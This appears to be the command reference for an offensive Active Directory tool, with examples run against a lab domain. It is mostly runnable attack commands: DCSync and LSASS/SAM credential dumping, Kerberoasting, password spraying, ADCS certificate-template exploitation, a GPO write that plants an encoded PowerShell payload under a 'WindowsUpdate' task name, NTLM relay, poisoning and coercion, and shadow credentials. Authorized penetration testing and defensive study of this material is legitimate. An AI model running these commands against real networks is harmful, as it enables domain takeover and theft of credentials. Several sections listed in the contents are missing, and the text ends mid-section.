# Overthrone v0.4.0 — Complete Command Reference

> Real usage examples for every command across all 9 crates.
> Tested against GOAD-Light (WS2025) — `sevenkingdoms.local` (192.168.57.10)

Every command works as both `overthrone <cmd>` and `ovt <cmd>`. We use `ovt` because life is short and keystrokes are precious.

---

## Table of Contents

### 🔧 Global & Auth
- [Global Flags](#global-flags)
- [Auth & Credential Options](#auth--credential-options)

### 🔍 Phase 1: Recon & Enumeration
- [Core Enumeration (`ovt enum`)](#core-enumeration-ovt-enum)
- [Scan (`ovt scan`)](#scan-ovt-scan)
- [Reaper Assessment (`ovt reaper`)](#reaper-assessment-ovt-reaper)
- [PowerView (`ovt powerview`)](#powerview-ovt-powerview)
- [Snaffler (`ovt snaffler`)](#snaffler-ovt-snaffler)
- [GUID Resolver (`ovt guid`)](#guid-resolver-ovt-guid)
- [BloodHound Integration (`ovt bloodhound`)](#bloodhound-integration-ovt-bloodhound)
- [Attack Graph Engine (`ovt graph`)](#attack-graph-engine-ovt-graph)

### 🔑 Phase 2: Credential Access
- [Kerberos Operations (`ovt kerberos`)](#kerberos-operations-ovt-kerberos)
- [Password Spray (`ovt spray`)](#password-spray-ovt-spray)
- [Credential Dumping (`ovt dump`)](#credential-dumping-ovt-dump)
- [Offline Secrets (`ovt secrets`)](#offline-secrets-ovt-secrets)
- [Crack Hash Cracking (`ovt crack`)](#crack-hash-cracking-ovt-crack)
- [GPP Decryption (`ovt gpp`)](#gpp-decryption-ovt-gpp)
- [LAPS (`ovt laps`)](#laps-ovt-laps)
- [RID Cycling (`ovt rid`)](#rid-cycling-ovt-rid)

### 🚀 Phase 3: Lateral Movement
- [Remote Execution (`ovt exec`)](#remote-execution-ovt-exec)
- [Interactive Remote Shell (`ovt shell`)](#interactive-remote-shell-ovt-shell)
- [SMB Operations (`ovt smb`)](#smb-operations-ovt-smb)
- [Move Lateral Movement (`ovt move`)](#move-lateral-movement-ovt-move)
- [MSSQL Operations (`ovt mssql`)](#mssql-operations-ovt-mssql)
- [SCCM Abuse (`ovt sccm`)](#sccm-abuse-ovt-sccm)

### 👑 Phase 4: Privilege Escalation & Persistence
- [ADCS Exploitation (`ovt adcs`)](#adcs-exploitation-ovt-adcs)
- [Forge Ticket Forging (`ovt forge`)](#forge-ticket-forging-ovt-forge)
- [Shadow Credentials (`ovt shadow`)](#shadow-credentials-ovt-shadow)
- [ACL/DACL Abuse (`ovt acl`)](#acldacl-abuse-ovt-acl)
- [GPO Abuse (`ovt gpo`)](#gpo-abuse-ovt-gpo)

### 🔄 Phase 5: Relay & Coercion
- [Relay & Coercion (`ovt ntlm`)](#relay--coercion-ovt-ntlm)

### 📊 Phase 6: Analysis & Visualization
- [TUI Viewer (`ovt tui`)](#tui-viewer-ovt-tui)
- [Viewer Server (`ovt viewer`)](#viewer-server-ovt-viewer)

### ⚙️ Phase 7: Infrastructure & Management
- [Session Management (`ovt session`)](#session-management-ovt-session)
- [Configuration (`ovt config`)](#configuration-ovt-config)
- [Interactive Shell REPL (`ovt shell`)](#interactive-shell-repl-ovt-shell)
- [Built-in Module System (`ovt module`)](#built-in-module-system-ovt-module)
- [Plugin System (`ovt plugin`)](#plugin-system-ovt-plugin)
- [Engagement Reporting (`ovt report`)](#engagement-reporting-ovt-report)
- [Environment Diagnostics (`ovt doctor`)](#environment-diagnostics-ovt-doctor)
- [Shell Tab Completion (`ovt completions`)](#shell-tab-completion-ovt-completions)
- [C2 Integration (`ovt c2`)](#c2-integration-ovt-c2)
- [Azure Operations (`ovt azure`)](#azure-operations-ovt-azure)

### 📖 Reference
- [Common Workflows](#common-workflows)
- [CVE Exploit Quick Reference](#cve-exploit-quick-reference)
- [Quick Reference Card](#quick-reference-card)
- [VulnAD Quick-Start](#vulnad-quick-start)

---

## Global Flags

These flags apply to most subcommands:

```bash
# Credential sources
-H, --dc-host <IP>              # Domain controller IP (env: OT_DC_HOST)
-d, --domain <FQDN>             # Domain name (env: OT_DOMAIN)
-u, --username <USER>           # Username (env: OT_USERNAME)
-p, --password <PASS>           # Password (env: OT_PASSWORD)
    --nt-hash <HASH>            # NTLM hash for PtH (env: OT_NT_HASH)
    --ticket <FILE>             # Kerberos ticket file (env: KRB5CCNAME)
-A, --auth-method <METHOD>      # password|hash|ticket (default: password)
-U, --user-list <FILE>          # File with usernames (one per line)
-P, --pass-list <FILE>          # File with passwords (one per line)
    --user-pass-list <FILE>     # File with user:pass or user:ntlm_hash pairs
    --ldaps                     # Use LDAP over SSL (port 636)

# Output
    --output-format <FMT>       # text|json|csv (default: text)
    --json-log                  # Structured JSON logging to stdout
-O, --outfile <FILE>            # Write output to file
    --dry-run                   # Validate without executing

# General
-v, --verbose                   # Increase verbosity (repeatable: -v info, -vv debug, -vvv trace)
```

---

## Core Enumeration (`ovt enum`)

Enumerate specific AD object types without running the full reaper engine.

```bash
# Pre-authentication discovery (no creds needed)
ovt enum pre -H 192.168.57.10 -d sevenkingdoms.local

# Null-session enumeration (no creds)
ovt enum null-session -H 192.168.57.10 -d sevenkingdoms.local

# Anonymous LDAP bind check
ovt enum anonymous -H 192.168.57.10 -d sevenkingdoms.local

# Full user enumeration
ovt enum users -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Full computer enumeration
ovt enum computers -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Full group enumeration
ovt enum groups -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Trust enumeration
ovt enum trusts -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# SPN enumeration (find kerberoastable accounts)
ovt enum spns -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# AS-REP roastable user enumeration
ovt enum asrep -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Delegation enumeration
ovt enum delegations -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# GPO enumeration
ovt enum gpos -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# LAPS enumeration
ovt enum laps -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Password policy enumeration
ovt enum policy -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Full enumeration (all of the above)
ovt enum all -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# With filters
ovt enum users -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --filter "admin"
ovt enum users -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --include-disabled
```

| Flag | Default | What it does |
|---|---|---|
| `--filter` | | LDAP filter string to narrow results |
| `--include-disabled` | `false` | Include disabled accounts |

| Target | What it finds |
|---|---|
| `pre` | No-credential AD service triage (Kerberos, LDAP, SMB, RPC, GC, RDP, WinRM, ADWS ports) |
| `anonymous` | Anonymous LDAP bind + RootDSE attributes |
| `null-session` | Null-session RID cycling (default RID range 500-1100) |
| `users` | All domain users |
| `computers` | All machine accounts |
| `groups` | Groups and memberships |
| `trusts` | Domain trusts |
| `spns` | Kerberoastable service accounts |
| `asrep` | AS-REP roastable accounts |
| `delegations` | Constrained, unconstrained, RBCD |
| `gpos` | Group Policy Objects |
| `laps` | LAPS-readable secrets |
| `policy` | Password and domain policy |
| `all` | Everything above |

---

## Scan (`ovt scan`)

Port scanner with optional LDAP/SMB null-session probes. Aliases: `ovt portscan`, `ovt discovery`.

```bash
# Scan top 1000 ports on target
ovt scan --targets 192.168.57.10

# Custom port range with LDAP + SMB null-session checks
ovt scan --targets 192.168.57.10 -P 80,443,445,3389,5985 --ldap --smb

# Port scan only, skip null-session probes
ovt scan --targets 192.168.57.0/24 --no-ldap --no-smb

# SYN scan (requires root/raw sockets)
ovt scan --targets 192.168.57.0/24 --scan-type syn

# ACK scan (firewall rule mapping)
ovt scan --targets 192.168.57.0/24 --scan-type ack
```

| Flag | Default | What it does |
|---|---|---|
| `--targets`, `-t` | required | Target hosts (IP, CIDR, or range) |
| `--ports`, `-P` | `top1000` | Port range: `80,443`, `1-65535`, or `top1000` |
| `--scan-type`, `-T` | `connect` | `syn` (needs root), `connect`, `ack` |
| `--timeout` | `1000` | Timeout in milliseconds |
| `--ldap` | `true` | Enable anonymous LDAP RootDSE probe |
| `--smb` | `true` | Enable SMB null-session share checks |
| `--no-ldap` | `false` | Skip LDAP checks |
| `--no-smb` | `false` | Skip SMB checks |

---

## Snaffler (`ovt snaffler`)

Recursively scans accessible SMB shares for high-value files.

```bash
# Snaffle all computers found in AD
ovt snaffler -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Save findings to JSON
ovt snaffler -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant \
  --output-format json -O findings.json
```

| Flag | Default | What it does |
|---|---|---|
| `--page-size` | `500` | LDAP page size for computer enumeration |

---

## PowerView (`ovt powerview`)

PowerView-style granular AD enumeration. Aliases: `pv`, `power-view`.

```bash
# Get detailed GPO info
ovt powerview gpos --name "Default Domain Policy" -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Get all properties for a specific user
ovt powerview users --identity "vagrant" -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Find abusable ACEs for a trustee SID
ovt powerview acls --sid S-1-5-21-...-1105 -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
```

| Subcommand | What it does |
|---|---|
| `users [--identity] [--filter] [--include-disabled]` | Enumerate users |
| `computers [--filter] [--include-disabled]` | Enumerate computers |
| `groups [--group] [--filter]` | Enumerate groups |
| `trusts` | Enumerate domain trusts |
| `spns` | Enumerate Kerberoastable SPNs |
| `asrep` | Enumerate AS-REP roastable accounts |
| `delegations` | Enumerate delegation configurations |
| `gpos [--name]` | Enumerate GPOs |
| `policy` | Enumerate password/domain policy |
| `laps [--computer]` | Read LAPS passwords |
| `acls [--sid]` | Enumerate abusable ACLs for a SID |
| `all` | Enumerate everything |

---

## GUID Resolver (`ovt guid`)

Resolve common AD control-access and attribute GUIDs.

```bash
# Resolve by right name
ovt guid resolve ForceChangePassword

# Resolve by raw GUID
ovt guid resolve 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

# List built-in mappings, optionally filtered
ovt guid list --filter replication
```

| Subcommand | What it does |
|---|---|
| `resolve <VALUE>` | Resolve a GUID, right name, or attribute name |
| `list [--filter]` | List built-in GUID mappings |

---

## Credential Dumping (`ovt dump`)

```bash
# DCSync a single user's hash
ovt dump 192.168.57.10 ntds --user vagrant -d sevenkingdoms.local -u vagrant -p vagrant

# DCSync all NTDS hashes (requires DRSUAPI access)
ovt dump 192.168.57.10 dcsync -d sevenkingdoms.local -u vagrant -p vagrant

# NTDS.dit via VSS shadow copy + SMB @GMT read (bypasses WS2025 file-write sandbox)
# Creates a Volume Shadow Copy, reads NTDS.dit + SYSTEM directly via @GMT- path
ovt dump 192.168.57.10 ntds-vss -d sevenkingdoms.local -u vagrant -p vagrant

# LSASS dump via comsvcs.dll (Windows)
ovt dump 192.168.57.10 lsass -d sevenkingdoms.local -u vagrant -p vagrant

# SAM registry hive dump (requires local admin)
ovt dump 192.168.57.10 sam -d sevenkingdoms.local -u vagrant -p vagrant

# LSA secrets dump
ovt dump 192.168.57.10 lsa -d sevenkingdoms.local -u vagrant -p vagrant

# DCC2 cached credentials dump
ovt dump 192.168.57.10 dcc2 -d sevenkingdoms.local -u vagrant -p vagrant

# Full dump (all available methods)
ovt dump 192.168.57.10 all -d sevenkingdoms.local -u vagrant -p vagrant
```

| Flag | Default | What it does |
|---|---|---|
| `--target`, `-t` | required | Target host |
| `source` | (positional, required) | `sam`, `lsa`, `ntds`, `dcc2`, `lsass`, `ntds-vss`, `all` |

---

## Kerberos Operations (`ovt kerberos`)

Aliases: `ovt krb`, `ovt roast`.

```bash
# Kerberoast (request TGS for SPN accounts)
ovt kerberos roast -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
ovt kerberos roast --spn MSSQLSvc/kingslanding.sevenkingdoms.local:1433

# AS-REP roast (no pre-auth required)
ovt kerberos asrep-roast -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
ovt kerberos asrep-roast --userlist users.txt

# Get TGT for a user
ovt kerberos get-tgt -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Get TGS for a specific SPN
ovt kerberos get-tgs -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --spn "MSSQLSvc/kingslanding.sevenkingdoms.local:1433"

# User enumeration via Kerberos (brute-force valid usernames)
ovt kerberos user-enum -H 192.168.57.10 -d sevenkingdoms.local --user-list users.txt
ovt kerberos user-enum -H 192.168.57.10 -d sevenkingdoms.local --use-ldap
ovt kerberos user-enum -H 192.168.57.10 -d sevenkingdoms.local \
  --userlist /usr/share/seclists/Usernames/Names/names.txt \
  --concurrency 20 --delay 100
```

| Subcommand | Flags | What it does |
|---|---|---|
| `roast` | `--spn` (optional) | Kerberoast SPN accounts |
| `asrep-roast` | `--userlist`/`-U` (optional) | AS-REP roast no-preauth accounts |
| `user-enum` | `--userlist`, `--output`, `--delay`, `--concurrency`, `--use-ldap` | Zero-knowledge username enumeration |
| `get-tgt` | | Request a TGT |
| `get-tgs` | `--spn` (required) | Request a TGS for a specific SPN |

---

## Password Spray (`ovt spray`)

The "try one password against everyone" attack.

```bash
ovt spray -H 192.168.57.10 -d sevenkingdoms.local \
  --password 'Season2026!' --userlist users.txt --delay 1 --jitter 0

# With LDAP-backed user enumeration
ovt spray -H 192.168.57.10 -d sevenkingdoms.local \
  --password 'Season2026!' --use-ldap --concurrency 10
```

| Flag | Default | What it does |
|---|---|---|
| `--password`, `-p` | required | The password to spray |
| `--userlist`, `-U` | | File with usernames (also `--users`) |
| `--use-ldap` | `false` | Attempt LDAP-based username enumeration |
| `--delay` | `1` | Seconds between attempts |
| `--jitter` | `0` | Random extra delay |
| `--concurrency` | `10` | Concurrent authentication attempts |

---

## ADCS Exploitation (`ovt adcs`)

Alias: `ovt certify`.

```bash
# Enumerate ADCS configuration and vulnerable templates
ovt adcs enum -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
ovt adcs enum --ca kingslanding.sevenkingdoms.local

# ESC1 -- SAN abuse (needs Enroll permission on vulnerable template)
ovt adcs esc1 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "User" --target-user "administrator" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!' --http

# ESC1 with HTTPS (if TLS configured)
ovt adcs esc1 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "User" --target-user "administrator" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!'

# ESC2 -- Any-purpose EKU template
ovt adcs esc2 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "EnrollmentAgent" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!' --http

# ESC3 -- Enrollment Agent certificate
ovt adcs esc3 --ca "192.168.57.10\SEVENKINGDOMS-CA" --agent-template "EnrollmentAgent" --user-template "User" --target-user "administrator" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!' --http

# ESC4 -- ACL abuse on certificate template (commands generated)
ovt adcs esc4 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "User" --principal "vagrant" --add-enroll

# ESC5 -- PKI ACL abuse (commands generated)
ovt adcs esc5 --ca "192.168.57.10\SEVENKINGDOMS-CA" --add-vulnerable-principal "vagrant"

# ESC6 -- EDITF_ATTRIBUTESUBJECTALTNAME2 abuse
ovt adcs esc6 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "User" --target-user "administrator" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!' --http

# ESC7 -- CA manager approval bypass (commands generated)
ovt adcs esc7 --ca "192.168.57.10\SEVENKINGDOMS-CA" --issue-on-behalf-of "vagrant" --template "User"

# ESC8 -- NTLM relay to ADCS Web Enrollment (commands generated)
ovt adcs esc8 --url "http://192.168.57.10/certsrv/" --target-user "administrator"

# ESC9 -- No security extension (UPN poisoning)
ovt adcs esc9 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "User" --target-user "vagrant" --victim-user "administrator" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!' --http

# ESC10 -- Weak certificate mapping
ovt adcs esc10 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "User" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!'

# ESC11 -- ICERTREQUEST RPC relay (commands generated)
ovt adcs esc11 --ca "192.168.57.10\SEVENKINGDOMS-CA" --target "192.168.57.10"

# ESC12 -- CA certificate extraction (commands generated)
ovt adcs esc12 --ca "kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA"

# ESC13 -- Template with dangerous EKU
ovt adcs esc13 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "Administrator" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!'

# ESC14 -- Certificate store pollution
ovt adcs esc14 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "User" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!'

# ESC15 -- Enrollee-supplies-subject (SAN flag) with manager approval bypass
ovt adcs esc15 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "WebServer" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!' --http

# ESC16 -- SAN abuse via LDAP-based template update
ovt adcs esc16 --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "User" -H 192.168.57.10 -d sevenkingdoms.local -u administrator -p 'Password123!'

# Auto-scan all ESC vulnerabilities
ovt adcs auto -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Generic certificate request via web enrollment
ovt adcs request --ca "192.168.57.10\SEVENKINGDOMS-CA" --template "User" -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --http
```

---

## GPO Abuse (`ovt gpo`)

Write ImmediateTask XML to SYSVOL for code execution via Computer/User GPO.

```bash
# Enumerate all GPOs in the domain
ovt gpo enum -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Write a malicious Immediate Task to a GPO (requires GPO write access)
ovt gpo write -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --gpo "{31B2F340-016D-11D2-945F-00C04FB984F9}" `
    --sysvol "\\sevenkingdoms.local\sysvol\sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}" `
    --command "powershell -enc <base64-encoded-payload>"

# Custom task name
ovt gpo write -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --gpo "{31B2F340-016D-11D2-945F-00C04FB984F9}" `
    --sysvol "\\sevenkingdoms.local\sysvol\sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}" `
    --command "whoami" --task-name "WindowsUpdate"

# Apply to User policy directory instead of Machine
ovt gpo write -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --gpo "{31B2F340-016D-11D2-945F-00C04FB984F9}" `
    --sysvol "\\sevenkingdoms.local\sysvol\sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}" `
    --command "whoami" --user-policy

# Remove the malicious task from a GPO
ovt gpo cleanup -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --gpo "{31B2F340-016D-11D2-945F-00C04FB984F9}" `
    --sysvol "\\sevenkingdoms.local\sysvol\sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}"
```

| Subcommand | Flags | What it does |
|---|---|---|
| `enum` | | Enumerate all GPOs and their links |
| `write` | `--gpo`/`-g` (required), `--sysvol` (required), `--command`/`-c` (required), `--task-name` (default: `OT-Maint`), `--user-policy` | Write ImmediateTask to SYSVOL |
| `cleanup` | `--gpo`/`-g` (required), `--sysvol` (required), `--task-name` (default: `OT-Maint`), `--user-policy` | Remove previously-written task |

---

## Relay & Coercion (`ovt ntlm`)

Alias: `ovt relay`.

```bash
# Classic NTLM relay (HTTP -> SMB)
ovt ntlm relay -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "smb://192.168.57.10" --port 8080 --interface 0.0.0.0

# SMB relay (SMB -> SMB)
ovt ntlm smb-relay -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "smb://192.168.57.10" --port 8445 --interface 0.0.0.0

# HTTP relay (HTTP -> HTTP, e.g., Exchange)
ovt ntlm http-relay -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "https://mail.corp.local/ews/exchange.asmx" --port 8080

# LDAP relay (HTTP -> LDAP)
ovt ntlm ldap-relay -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "ldap://192.168.57.10" --port 8080

# HTTP->SMB asymmetric relay (capture HTTP, replay to SMB)
ovt ntlm http-asymmetric -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --targets "http://192.168.57.10/certsrv/","smb://192.168.57.10" --port 8080

# ADCS relay (NTLM relay to certsrv endpoint)
ovt ntlm adcs-relay -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "http://192.168.57.10/certsrv/" --port 8080 --cert-template "User"

# Capture NTLM hashes (Responder-style)
ovt ntlm capture --interface eth0
ovt ntlm capture --interface eth0 --no-poison

# Poisoner (LLMNR/NBT-NS/mDNS spoofing)
ovt ntlm poison --interface eth0

# Responder (HTTP/SMB/MySQL/FTP/LDAP rogue servers)
ovt ntlm respond --interface eth0

# Coercion triggers

# Printer Bug (MS-RPRN) -- unauthenticated
ovt ntlm trigger-printer-bug -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "192.168.57.22" --capture-ip "192.168.57.5"

# Printer Bug -- with authenticated SMB
ovt ntlm trigger-printer-bug -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "192.168.57.22" --capture-ip "192.168.57.5" --coerce-domain sevenkingdoms.local --coerce-user vagrant --coerce-password vagrant

# PetitPotam (MS-EFSRPC) -- unauthenticated
ovt ntlm trigger-petitpotam -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "192.168.57.22" --capture-ip "192.168.57.5"

# PetitPotam -- with authenticated SMB
ovt ntlm trigger-petitpotam -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "192.168.57.22" --capture-ip "192.168.57.5" --coerce-domain sevenkingdoms.local --coerce-user vagrant --coerce-password vagrant

# DFS Coercion (MS-DFSNM)
ovt ntlm trigger-dfs -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "192.168.57.22" --capture-ip "192.168.57.5"

# Exchange relay via NTLM
ovt ntlm exchange -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "https://mail.corp.local/ews/exchange.asmx" --port 8080

# All relay options:
#   --socks5-proxy <PROXY>          Route through SOCKS5 proxy
#   --tls-verify                    Validate server TLS cert
#   --auto-coerce-domain/user/pass  Auto-trigger coercion before relay
```

| Subcommand | Flags | What it does |
|---|---|---|
| `capture` | `--interface`/`-i` (default: `0.0.0.0`), `--port`/`-P` (default: `445`), `--no-poison` | Capture NTLM hashes |
| `relay` | `--targets`/`-t` (required, comma-separated), `--port`/`-P` (default: `445`), `--command`/`-c`, `--no-poison` | Relay to targets |
| `smb-relay` | `--targets`/`-t` (required), `--port`/`-P` (default: `445`), `--command`/`-c` | SMB relay with signing bypass |
| `http-relay` | `--targets`/`-t` (required), `--port`/`-P` (default: `80`), `--command`/`-c` | HTTP/HTTPS relay |
| `ldap-relay` | `--target` (required), `--port` (default: `8080`) | LDAP relay |
| `http-asymmetric` | `--targets` (required), `--port` (default: `8080`) | HTTP->SMB asymmetric relay |
| `adcs-relay` | `--target` (required), `--port` (default: `8080`), `--cert-template` | ADCS NTLM relay |
| `poison` | `--interface`/`-i` (default: `0.0.0.0`) | LLMNR/NBT-NS/mDNS spoofing |
| `respond` | `--interface`/`-i` (default: `0.0.0.0`) | Rogue protocol servers |
| `trigger-printer-bug` | `--target`, `--capture-ip`, `--coerce-domain/user/password` (optional) | MS-RPRN coercion |
| `trigger-petitpotam` | `--target`, `--capture-ip`, `--coerce-domain/user/password` (optional) | MS-EFSRPC coercion |
| `trigger-dfs` | `--target`, `--capture-ip` | MS-DFSNM coercion |
| `exchange` | `--target`, `--port` (default: `8080`) | Exchange NTLM relay |

---

## Shadow Credentials (`ovt shadow`)

```bash
# Add KeyCredential to a target user (requires write permission on target)
ovt shadow add -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "vagrant" --device-id "test-device"

# Remove KeyCredential from target
ovt shadow remove -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "vagrant" --device-id "test-device"

# List shadow credentials on target
ovt shadow list -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "vagrant"

# Full attack: add key, get TGT, remove key
ovt shadow attack -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
    --target "vagrant"
```

---

## LAPS (`ovt laps`)

Read local admin passwords stored in AD (LAPS v1 + v2).

```bash
# Read LAPS passwords (requires LAPS permission)
ovt laps get -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Read LAPS password for a specific computer
ovt laps get -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --computer "KINGSLANDING$"

# Read LAPS v2 encrypted password
ovt laps get-v2 -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --computer "KINGSLANDING$"
```

| Flag | Default | What it does |
|---|---|---|
| `--computer` | none | Only query a specific computer |

---

## RID Cycling (`ovt rid`)

Aliases: `ovt rid-cycle`, `ovt rid-brute`.

Enumerate users/groups via MS-SAMR.

```bash
# Default range (RID 500-10500)
ovt rid -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Custom range
ovt rid -H 192.168.57.10 -d sevenkingdoms.local --start-rid 500 --end-rid 50000

# Null session (no creds needed, if DC allows it)
ovt rid -H 192.168.57.10 -d sevenkingdoms.local --null-session
```

| Flag | Default | What it does |
|---|---|---|
| `--start-rid` | `500` | Starting RID |
| `--end-rid` | `10500` | Ending RID |
| `--null-session` | `false` | Use null session (no credentials) |

---

## BloodHound Integration (`ovt bloodhound`)

```bash
# Collect BloodHound data (users, groups, computers, OUs, GPOs, trusts)
ovt bloodhound collect -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Collect with detailed ACL analysis
ovt bloodhound collect -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --include-acls

# Analyze collected data (find shortest attack paths)
ovt bloodhound analyze -d sevenkingdoms.local --input-dir ./bloodhound_data

# Run Cypher query against collected data
ovt bloodhound query -d sevenkingdoms.local --query "MATCH (n:User) RETURN n.name LIMIT 10"

# Visualize attack graph in terminal
ovt bloodhound viz -d sevenkingdoms.local --input-dir ./bloodhound_data
```

---

## Attack Graph Engine (`ovt graph`)

Build, query, and export the attack relationship graph. BloodHound vibes, zero Neo4j.

```bash
# Build the graph from enumeration data
ovt graph build -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Launch interactive TUI graph viewer
ovt graph view --file attack_graph.json
ovt graph view -i ./bloodhound-json/

# Launch interactive BloodHound-style hierarchy/tree explorer
ovt graph tree --file attack_graph.json
ovt graph tree -i ./bloodhound-json/

# Launch browser-based graph GUI (local web server)
ovt graph gui --file attack_graph.json
ovt graph gui -i ./graphs/
ovt graph gui -i ./graphs/ --port 8080

# Find shortest path between two nodes
ovt graph path --from vagrant --to "Domain Admins"

# Find ALL paths to Domain Admins from a user
ovt graph path-to-da --from vagrant

# Graph stats
ovt graph stats

# Export (JSON or BloodHound format)
ovt graph export --output graph.json
ovt graph export --output bloodhound.json --bloodhound
```

| Subcommand | Flags | What it does |
|---|---|---|
| `build` | `--file` (default: `attack_graph.json`) | Build graph from LDAP |
| `view` | `--input`/`-i` (default: `attack_graph.json`) | TUI graph viewer (aliases: `visual`, `ui`, `viz`) |
| `tree` | `--input`/`-i` (default: `attack_graph.json`) | Tree explorer (aliases: `hierarchy`, `explore`) |
| `gui` | `--input`/`-i`, `--port` (default: `0` = free port) | Browser-based GUI (aliases: `web`, `browser`) |
| `path` | `--from` (required), `--to`/`-t` (required) | Shortest path between two nodes |
| `path-to-da` | `--from` (required) | All paths to Domain Admins |
| `stats` | `--file` | Graph statistics |
| `export` | `--output`/`-o`, `--bloodhound`/`-B` | Export graph to JSON |

---

## Reaper Assessment (`ovt reaper`)

The "tell me everything" command. Runs all enumeration modules against the DC via LDAP. Aliases: `ovt harvest`.

```bash
# Full domain risk assessment
ovt reaper -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant

# Reaper with specific modules
ovt reaper -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --modules "users,computers,groups,acls"

# Snaffler module (share scanning for sensitive files)
ovt reaper -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --snaffle

# Snaffler with custom share and depth
ovt reaper -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --snaffle --snaffle-shares "admin$,C$" --snaffle-depth 3

# ACL analysis (find abusable permissions)
ovt reaper -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --acl

# LAPS audit (check LAPS deployment status)
ovt reaper -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --laps

# MSSQL audit (find SQL Server instances and privilege escalations)
ovt reaper -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --mssql

